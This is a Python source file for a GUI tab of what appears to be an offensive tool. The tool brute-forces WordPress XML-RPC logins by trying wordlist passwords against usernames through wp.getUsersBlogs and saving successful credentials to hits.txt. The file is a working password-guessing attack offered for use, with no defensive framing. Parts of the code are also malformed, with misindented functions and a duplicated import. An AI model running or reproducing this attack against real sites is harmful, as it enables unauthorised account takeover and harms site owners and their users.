import customtkinter as ctk
from tkinter import messagebox
import xmlrpc.client
import customtkinter as ctk
import threading
from core.controller import start_brute_force

class BruteTab(ctk.CTkFrame):
    def __init__(self, master):
        super().__init__(master)
        self.build_ui()

    def build_ui(self):
        ctk.CTkLabel(self, text="Brute Force", font=("Segoe UI", 18, "bold")).pack(pady=10)

        self.url_entry = ctk.CTkEntry(self, placeholder_text="Target XML-RPC URL")
        self.url_entry.pack(pady=10, padx=20, fill="x")

        self.user_entry = ctk.CTkEntry(self, placeholder_text="Username")
        self.user_entry.pack(pady=10, padx=20, fill="x")

        self.status_var = ctk.StringVar(value="Idle")
        ctk.CTkLabel(self, textvariable=self.status_var, text_color="gray").pack(pady=5)

        self.start_button = ctk.CTkButton(self, text="Start Brute Force", command=self.run_brute_threaded)
        self.start_button.pack(pady=10)

    def run_brute_threaded(self):
        url = self.url_entry.get()
        user = self.user_entry.get()

        if not url or not user:
            self.status_var.set("Please enter both URL and username.")
            return

        self.status_var.set("Running brute force...")
        threading.Thread(target=self.run_brute_force, args=(url, user), daemon=True).start()

    def run_brute_force(self, url, user):
        try:
            start_brute_force(url, user)
            self.status_var.set("Brute force completed.")
        except Exception as e:
            self.status_var.set(f"Error: {str(e)}")
            
    def brute_force_action(target_entry, usernames_box, wordlist_entry, log_box):
    target = target_entry.get().strip()
    usernames = [u.strip() for u in usernames_box.get("1.0", "end").strip().splitlines()]
    wordlist_path = wordlist_entry.get().strip()

    if not target or not usernames or not wordlist_path:
        messagebox.showerror("Error", "Please fill all fields.")
        return

    try:
        with open(wordlist_path, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        messagebox.showerror("File Error", f"Cannot read password list:\n{e}")
        return

    log_box.insert("end", "[*] Starting brute force...\n")
    server = xmlrpc.client.ServerProxy(target)

    for user in usernames:
        log_box.insert("end", f"\n[*] Trying user: {user}\n")
        for password in passwords:
            try:
                resp = server.wp.getUsersBlogs(user, password)
                if resp:
                    hit = f"[+] HIT: {user}:{password}\n"
                    log_box.insert("end", hit)
                    with open("hits.txt", "a") as hit_file:
                        hit_file.write(f"{user}:{password}\n")
                    break
            except xmlrpc.client.Fault:
                pass
            except Exception as e:
                log_box.insert("end", f"[-] Error with {user}: {e}\n")
                break
    log_box.insert("end", "[*] Brute force finished.\n")

    def brute_tab_widgets(tab):
        target_entry = ctk.CTkEntry(tab, placeholder_text="Target URL")
        target_entry.pack(pady=10, padx=10)

        usernames_box = ctk.CTkTextbox(tab, height=10, width=40)
        usernames_box.pack(pady=10, padx=10)

        wordlist_entry = ctk.CTkEntry(tab, placeholder_text="Path to wordlist")
        wordlist_entry.pack(pady=10, padx=10)

        log_box = ctk.CTkTextbox(tab, height=15, width=80)
        log_box.pack(pady=10, padx=10)

        brute_button = ctk.CTkButton(tab, text="Start Brute Force", command=lambda: brute_force_action(target_entry, usernames_box, wordlist_entry, log_box))
        brute_button.pack(pady=10, padx=10)
